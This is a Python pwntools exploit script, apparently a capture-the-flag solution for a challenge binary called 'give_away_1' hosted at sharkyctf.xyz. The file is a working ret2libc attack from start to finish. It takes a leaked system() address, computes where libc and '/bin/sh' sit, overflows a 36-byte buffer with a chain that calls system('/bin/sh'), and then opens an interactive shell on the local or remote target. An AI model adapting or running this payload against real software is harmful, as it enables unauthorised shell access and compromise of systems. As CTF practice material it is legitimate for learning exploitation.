from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./give_away_1"
HOST = "sharkyctf.xyz"
PORT = 20334 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
plt_printf = elf.plt["printf"]
got_setvbuf = elf.got["setvbuf"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc-2.27.so')
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))

def exploit():
	bufsize = 0x20+4
	
	conn.recvuntil("away: ")
	libc_system = int(conn.recvline(),16)
	libc_base = libc_system - off_system
	libc_binsh = libc_base + off_binsh

	payload = "A"*bufsize
	payload += p32(libc_system)
	payload += p32(addr_main)
	payload += p32(libc_binsh)

	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
